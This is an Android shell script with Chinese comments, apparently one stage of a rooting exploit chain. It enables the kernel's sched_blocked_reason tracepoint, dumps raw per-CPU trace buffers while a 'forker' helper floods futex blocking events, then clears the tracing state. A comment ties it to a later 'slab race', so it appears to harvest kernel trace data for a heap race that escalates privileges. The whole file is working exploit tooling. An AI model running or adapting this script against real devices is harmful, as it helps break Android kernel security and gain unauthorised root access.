#!/system/bin/sh
# 抓取 sched_blocked_reason raw trace，并用 futex 阻塞放大事件量。
# 退出前恢复 tracing，避免干扰后续 slab 竞态。
D=/data/local/tmp/magic
cd "$D" || exit 1
TR=/sys/kernel/tracing
[ -d "$TR/events" ] || TR=/sys/kernel/debug/tracing
LOOPS=${1:-40}
MIN_BYTES=${2:-0}
case "$MIN_BYTES" in ''|*[!0-9]*) MIN_BYTES=0 ;; esac
CHUNK_LOOPS=${MAGICROOT_FORKER_CHUNK_LOOPS:-10}
case "$CHUNK_LOOPS" in ''|*[!0-9]*) CHUNK_LOOPS=10 ;; esac
[ "$CHUNK_LOOPS" -ge 1 ] 2>/dev/null || CHUNK_LOOPS=10

rm -f "$D"/bl_*.bin "$D"/bl_text.txt

echo 0 > "$TR/trace" 2>/dev/null
echo 1 > "$TR/events/sched/sched_blocked_reason/enable" 2>/dev/null
echo 1 > "$TR/tracing_on" 2>/dev/null

for c in 0 1 2 3 4 5 6 7; do
    cat "$TR/per_cpu/cpu$c/trace_pipe_raw" > "$D/bl_$c.bin" 2>/dev/null &
done
sleep 1

i=0
while [ $i -lt "$LOOPS" ]; do
    _take=$CHUNK_LOOPS
    [ $((i + _take)) -gt "$LOOPS" ] && _take=$((LOOPS - i))
    [ "$_take" -gt 0 ] || break
    # One persistent futex batch per chunk: same total 20ms rounds, far fewer
    # fork/exec/wait cycles than invoking forker once per loop.
    "$D/forker" 2 $((_take * 20)) >/dev/null 2>&1
    i=$((i + _take))
    if [ "$MIN_BYTES" -gt 0 ] 2>/dev/null; then
        _raw=$(cat "$D"/bl_*.bin 2>/dev/null | wc -c)
        if [ "$_raw" -ge "$MIN_BYTES" ] 2>/dev/null; then
            echo "GRAB_EARLY_STOP loops=$i bytes=$_raw threshold=$MIN_BYTES"
            break
        fi
    fi
done

sleep 1
pkill -f trace_pipe_raw 2>/dev/null
sleep 0.3

grep "sched_blocked_reason" "$TR/trace" > "$D/bl_text.txt" 2>/dev/null

echo 0 > "$TR/events/sched/sched_blocked_reason/enable" 2>/dev/null
echo 0 > "$TR/tracing_on" 2>/dev/null
echo 0 > "$TR/trace" 2>/dev/null
echo 'p' > "$TR/kprobe_events" 2>/dev/null || true

chmod 644 "$D"/bl_*.bin "$D"/bl_text.txt 2>/dev/null
TOTAL=$(cat "$D"/bl_*.bin 2>/dev/null | wc -c)
echo "M9_RAW_BYTES=$TOTAL"
echo "M9_TEXT_LINES=$(wc -l < "$D/bl_text.txt" 2>/dev/null || echo 0)"
echo GRAB_DONE
